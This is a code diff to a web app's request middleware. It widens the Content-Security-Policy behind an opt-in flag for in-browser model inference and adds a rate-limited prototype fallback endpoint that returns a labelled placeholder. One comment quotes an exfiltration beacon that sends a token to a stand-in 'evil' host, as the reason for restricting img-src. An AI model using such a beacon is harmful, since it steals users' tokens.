@@ -642,16 +642,27 @@ async def _request_context(request: Request, call_next):
         response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
     # CSP: our pages use inline <script>/<style>, so 'unsafe-inline' is required for
     # now. TODO(security): move page JS/CSS to static files with a nonce and drop it.
+    # Edge-Inference on-device path (opt-in, default OFF): running a model in the visitor's
+    # browser needs WASM compilation (`wasm-unsafe-eval`), blob: workers, and fetching model
+    # weights from the model host — all of which are DENIED by the locked-down default policy.
+    # We widen the policy ONLY when EDGE_INFERENCE_ENABLED=true, so production stays tight and
+    # the /edge demo simply uses the API fallback until an operator turns it on.
+    _edge_on = os.getenv("EDGE_INFERENCE_ENABLED", "false").lower() == "true"
+    _script_extra = " 'wasm-unsafe-eval' blob:" if _edge_on else ""
+    _connect_extra = (" https://huggingface.co https://cdn-lfs.huggingface.co "
+                      "https://cdn-lfs-us-1.huggingface.co https://cdn.jsdelivr.net") if _edge_on else ""
+    _worker_line = "worker-src 'self' blob:; " if _edge_on else ""
     response.headers["Content-Security-Policy"] = (
         "default-src 'self'; "
-        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
+        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net" + _script_extra + "; "
+        + _worker_line +
         "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
         "font-src 'self' https://fonts.gstatic.com; "
         # img-src is 'self' data: only (no blanket https:): all images are local (/static) or inline
         # SVG/data URIs, so this removes the `new Image().src='https://evil/?t='+token` beacon channel
         # that an injected script could otherwise use to exfiltrate data past connect-src 'self'.
         "img-src 'self' data:; "
-        "connect-src 'self'; "
+        "connect-src 'self'" + _connect_extra + "; "
         # Allow the landing-page YouTube embed to load. Without an explicit frame-src, CSP
         # falls back to default-src 'self' and the browser blocks the iframe ("content
         # blocked"). This lists only YouTube's embed hosts, nothing else.
@@ -1745,6 +1756,9 @@ _STATIC_ALLOW = {
     # mailbox providers can show the Petabyte mark as the sender avatar. See
     # docs/EMAIL_BIMI_SETUP.md.
     "petabyte-bimi.svg": "image/svg+xml",
+    # Edge-Inference SDK (prototype): runs an AI feature on the visitor's own WebGPU with a
+    # metered Petabyte-API fallback. See docs/EDGE_INFERENCE.md.
+    "petabyte-edge.js": "text/javascript; charset=utf-8",
 }
 
 @app.get("/static/{fname}")
@@ -1768,6 +1782,48 @@ def favicon():
                             headers={"Cache-Control": "public, max-age=86400"})
     except OSError:
         raise HTTPException(status_code=404, detail="not found")
+
+class EdgeInferModel(BaseModel):
+    prompt: str
+    model: Optional[str] = None
+    max_tokens: Optional[int] = None
+
+
+@app.post("/edge/infer", tags=["edge"])
+def edge_infer(data: EdgeInferModel, request: Request):
+    """Paid fallback for the Edge-Inference SDK (`/static/petabyte-edge.js`): the SDK runs a
+    model on the visitor's own WebGPU for free and calls this only when the visitor has no
+    capable GPU (or on-device inference is disabled). Public + per-IP rate-limited.
+
+    PROTOTYPE: returns a clearly-labelled placeholder — it never passes a canned string off as
+    a real model completion. Production wiring: route to a rented Petabyte GPU running
+    `data.model` (launch the `ollama`/`vllm` template, then proxy its OpenAI-compatible API)
+    and bill per token/second. See docs/EDGE_INFERENCE.md."""
+    ip = _client_ip(request) or "?"
+    key = f"edge:{ip}"
+    retry = _rl_blocked(key, 60, 3600)          # 60 fallback calls / hour / IP
+    if retry:
+        raise HTTPException(status_code=429, detail=f"rate limit: retry in ~{retry}s")
+    _rl_record_failure(key, 3600)               # count every call, not just failures
+    prompt = (data.prompt or "").strip()
+    if not prompt:
+        raise HTTPException(status_code=400, detail="prompt required")
+    if len(prompt) > 8000:
+        raise HTTPException(status_code=413, detail="prompt too long (8000 char cap)")
+    model = (data.model or "").strip()[:120] or "default"
+    return {
+        "source": "petabyte-fallback",
+        "model": model,
+        "prototype": True,
+        "text": (f"[Petabyte fallback · prototype] No WebGPU on this device (or on-device "
+                 f"inference is off), so in production this prompt would be served by a rented "
+                 f"Petabyte GPU running '{model}', billed per token. Received {len(prompt)} "
+                 f"characters. Wire /edge/infer to a launched ollama/vLLM node to return real "
+                 f"completions."),
+        "production": ("routes to a metered Petabyte GPU: launch the model as a template and "
+                       "proxy its OpenAI-compatible API; billed per token/second"),
+    }
+
 
 @app.get("/marketplace/specs/{public_id}", tags=["marketplace"])
 def public_spec_detail(public_id: str, db: Session = Depends(get_db)):
